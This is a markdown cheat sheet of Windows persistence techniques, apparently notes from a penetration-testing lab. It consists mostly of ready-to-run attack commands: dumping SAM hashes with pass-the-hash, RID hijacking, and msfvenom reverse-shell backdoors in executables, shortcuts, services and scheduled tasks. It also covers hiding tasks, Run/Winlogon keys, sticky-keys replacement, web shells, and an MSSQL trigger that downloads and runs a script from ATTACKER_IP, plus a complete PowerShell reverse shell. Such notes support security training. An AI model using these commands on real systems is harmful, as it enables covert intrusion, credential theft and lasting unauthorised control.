#Windows #Persistence 

## Tampering With Unprivileged Accounts

##### Assign Group Memberships

**Method 1:**

`net localgroup administrators <username> /add` - Add a user to the "Administrators" group, can be too suspicious.

**Method 2:**

`net localgroup "Backup Operators" <username> /add` - Add a user the the "Backup Operators" group.
`net localgroup "Remote Management Users" <username> /add` - Add a user the the "Remote Management Users" group so it can WinRM back to the machine (add to the "Remote Desktop Users" group for RDP).
`evil-winrm -i <ip address> -u <username> -p <password>` - Connect to the machine from the attacker machine.

by issuing `whoami /groups` you'll see the "Backup Operators" group is disabled, this is because of User Account Control (UAC) which strips administrative privileges when logging in remotely by using **LocalAccountTokenFilterPolicy**.

`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` - Change this registry key to 1 to disable **LocalAccountTokenFilterPolicy**.

Now you can connect with `evil-winrm` again and you will see the "Backup Operators" group enabled.

`reg save hklm\system system.bak` and `reg save hklm\sam sam.bak` - Make a backup of the sam and system files.
`download system.bak` and `download sam.bak` - Download the files to your machine, if it takes a long time you can use another method.
`python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL` - Dump the password hashes for all users.
`evil-winrm -i <ip address> -u Administrator -H hash` - Perform Pass-the-Hash attack to connect with administrative privileges. 

##### Special Privileges and Security Descriptors

You can directly add privileges to users without adding them to any group.
The "Backup Operators Group" has to privileges, **SeBackupPrivilege** which lets you read any file on the system and **SeRestorePrivilege** which lets you write to any file on the system.

`secedit /export /cfg config.inf` - Export  the current configuration to a temporary file.

Now change the respective lines:
![[765671a0355e2260c44e5a12a10f090e.png]]

`secedit /import /cfg config.inf /db config.sdb` - Convert the .inf file to a .sdb file.
`secedit /configure /db config.sdb /cfg config.inf` - Load the configuration back into the system.

Now instead of adding the user to the "Remote Management Users" group change the security descriptor (like an ACL but applied to other system facilities) associated with the WinRM service.

`Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` - Open WinRM's security descriptor.

Now add the user you need so he'll have full privileges to connect with WinRM, and follow the steps of using the sam and system files from the previous method.

##### RID Hijacking

Relative ID (RID) is a numeric representation of a user across the system, the LSASS assigns an access token based on it, changing the registry value to the same one of the administrator can assign a simple user administrative privileges.

Default administrator's **RID** = 500
Default regular user's **RID** >= 1000

`wmic useraccount get name,sid` - Find a user's assigned SID (identifies a user across a domain), the RID is the last bit of the SID
`PsExec64.exe -i -s regedit` - Run regedit with SYSTEM privileges using psexec from pstools (Administrator can't access the SAM).

Now in the registry go to `HKLM\SAM\SAM\Domains\Account\Users\`, search for a key with the RID of the user you want to use in hex, the F value holds the RID at position 0x30.

![[d630140974989748ebcf150ba0696d14.png]]

Now replace the bytes to those of the administrator's RID in hex (500 = 0x01F4).

![[8f2072b6d13b7343cf7b890586703ddf.png]]

## Backdooring Files

##### Executable Files

`msfvenom -a x64 --platform windows -x <frequently used .exe file> -k -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<port> -b "\x00" -f exe -o <output file>` - Plant a script that the user will execute every time he opens the .exe file.

##### Shortcut Files

Check the path the shortcut file is pointing to by looking at the properties.

`Start-Process -NoNewWindow <nc64.exe file location> "-e cmd.exe ,ATTACKER_IP> <port>"`
`<Path the shortcut file is pointing to>` - Create a Powershell script in a location like System32 that will execute a reverse shell and than the legitimate file.
`powershell.exe -WindowStyle hidden <Malicious file location>` - Change the path the shortcut file is pointing to with the malicious Powershell script, after that change the icon back to the previous location if needed.
`nc -lvp <port>` - Start a Netcat listener at any time and wait for the user to execute the file.

##### Hijacking File Associations

A key is stored for any file type under `HKLM\Software\Classes\`.

Check which program is used to open a file (which ProgID is associated with the file extension):

![[3ae1b8356b38a349090e836026d6d480.png]]

Now search for a subkey under `HKLM\Software\Classes\` and go to `shell\open\command` (most of the times it's there), where the default command to run files with that extension is specified:

![[c3565cf93de4990f41f41b25aed80571.png]]

the %1 in the image above represents the file to open.

`Start-Process -NoNewWindow <nc64.exe file location> "-e cmd.exe <ATTACKER_IP> <port>"`
`C:\Windows\system32\NOTEPAD.EXE $args[0]` - Create a powershell script that will run a reverse shell and than open the file.
`powershell.exe -WindowStyle hidden <Malicious file location> %1` - Change the registry key to run our malicious script.

## Abusing Services

##### Creating Backdoor Services

**Option 1:**

`sc.exe create <service name> binPath= "net user Administrator <new pass>" start= auto` - Crate a service that will change the administrator's password.
`sc.exe start <service name>` - Start the service.

**Option2:**

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe-service -o <output file name>` - Create a reverse shell with the exe-service format that is compatible with Windows services.

Now get the malicious service file to the target machine.

`sc.exe <service name> binPath= "<malicious file path>" start= auto` - Create a service that points to the malicious service file.
`sc.exe <service name> start` - start the service with a listener waiting in your machine.

##### Modifying Existing Services

`sc.exe query state=all` - Get a list of available services.

Search for a disabled service as you can alter it without the user noticing.

`sc.exe qc <stopped service name>` - Query the service's configuration.

the **BINARY_PATH_NAME** should point to our payload, the **START_TYPE** should be automatic so it'll run without user interaction and the **SERVICE_START_NAME** should preferably be set to LocalSystem to get SYSTEM privileges.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe-service -o <output file name>` - Create a reverse shell with msfvenom.
`sc.exe config <service name> binPath= "malicious file path" start= auto obj= "LocalSystem"` - Change the service parameters as needed.
`sc.exe <service name> start` - Start the service with a listener waiting in your machine.

## Abusing Scheduled Tasks

##### Task Scheduler

`schtasks /create /sc minute /mo 1 /tn <task name> /tr "<nc64 file location> -e cmd.exe <ATTACKER_IP> <port>" /ru SYSTEM` - Create a scheduled task that runs a reverse shell every minute.
`schtasks /query /tn <task name>` - Check that the task is created.

##### Making Our Task Invisible

You can delete the Security Descriptor (SD) of the task which is an ACL that states which users have access to the task, including seeing the task, deleting it will result in disallowing all users.

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` - The location of all the Security Descriptors of the tasks, the SD value under each task key contains the Security Descriptor.

`<PsExec64.exe file location> -s -i regedit` - Open the registry with SYSTEM privileges.

Now delete the SD, start a listener and you should get a shell after a minute.

## Logon Triggered Persistence

In all of the methods you'll need to start a listener and than log out and back in to the machine.

##### Startup Folder

`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` - The location for executables to run whenever the user logs in.
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` - The location for executables to run whenever any user logs in.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe -o <output file name>` - Create a reverse shell.
`python3 -m http.server` - Start a simple http server.
`wget http://<ATTACKER_IP>:8000/<payload file name> -O <output file name>` - Get the reverse shell to the target machine.

Now copy the file to the StartUp folder using the `copy` command.

##### Run / RunOnce

Registry entries to specify applications to run at logon:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Run is for every time the user logs in and programs under RunOnce will run only once.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe -o <output file name>` - Create a reverse shell.

Now move it to the `C:\Windows\` folder and create an entry at the registry with type `RED_EXPAND_SZ` and data as the path of the file.

##### Winlogon

The windows component that loads user profiles right after authentication (and other things too).

`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` - Location for Winlogon registry keys:

- `userinit`: In charge of restoring your user profile preferences.
- `shell`: Points to the system's shell, usually `explorer.exe`.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe -o <output file name>` - Create a reverse shell.

Now move the shell to the windows folder in the target machine, then add the location of the executable file to one of the above registry keys with a coma as a saperator.

##### Logon Scripts

The userinit.exe also looks for an environment variable called `UserInitMprLogonScript`.

You can use the reverse shell from the previous method, get it to any folder on the target's machine.

Now create this key under `HKCU\Environment`:

Name: UserInitMprLogonScript
Type: REG_EXPAND_SZ
Data: the location of the payload file

## Backdooring the Login Screen / RDP

##### Sticky Keys

Sticky keys lets you press keys one at a time instead of at the same time, to activate it you can press `SHIFT` 5 times.

You can replace the binary at `C:\Windows\System32\sethc.exe` with a copy of `cmd.exe` than press `SHIFT` 5 times in the lock screen to access CMD with SYSTEM privileges.

`takeown /f C:\Windows\System32\sethc.exe` - Take ownership of the file.
`icacls C:\Windows\System32\sethc.exe /grant <current user>:F` - Grant our current user permission to modify the file.
`copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` - Replace the Sticky Keys binary with a copy of `cmd.exe`

##### Utilman

A built-in Windows application used to provide Ease of Access options during the lock screen.

The steps are the same as in the previous method but replacing the `utilman.exe` binary instead of the `sethc.exe` binary.

## Persisting Through Existing Services

##### Using Web Shells

`move <web shell file> <webroot directory>` -Move a [web shell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) to the webroot directory which is by default `C:\inetpub\wwwroot`
`icacls <web shell file> /grant Everyone:F` - Grant permission to the file for everyone if needed.

Now you can access the shell and run commands trough `http://<Machine ip>/<web shell name>`.

The default user in IIS is `iis apppool\defaultapppool` even if it's unprivileged one you can use the [SeImpersonatePrivilege](Windows%20Privilege%20Escalation) to elevate privileges.

##### Using MSSQL as a Backdoor

**triggers**: Allow you to bind actions to be performed when specific events occur.

`xp_cmdshell` - Stored procedure that allows to run commands directly in the system's console, disabled by default.

In `Microsoft SQL Server Management Audio 18` click on `New Query`.

Enable Advanced Options and proceed to enable `xp_cmdshell`:

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Grant all users the privileges to run as the sa user (sysadmin), which is the only user that can run `xp_cmdshell` by default:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Change to the HRDB database:

```sql
USE HRDB
```

Leverage `xp_cmdshell` to execute a malicious .ps1 file from the attacker's webserver, whenever an `INSERT` is made into the `Employees` table of HRDB database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Create a Powershell reverse shell on the attacker machine:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

`python3 -m http.server` - setup the server to download and execute the reverse shell.

`nc -lvp 4454` - In another terminal listen for a connection.